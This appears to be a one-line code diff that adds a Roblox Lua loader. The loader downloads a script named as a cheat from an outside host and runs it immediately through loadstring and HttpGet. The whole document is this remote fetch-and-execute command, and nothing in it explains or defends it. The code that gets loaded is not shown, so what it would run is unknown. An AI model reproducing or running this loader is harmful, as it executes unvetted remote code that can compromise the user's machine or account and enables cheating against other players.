@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://grfbin.ml/cheatx/old-script.lua'))()
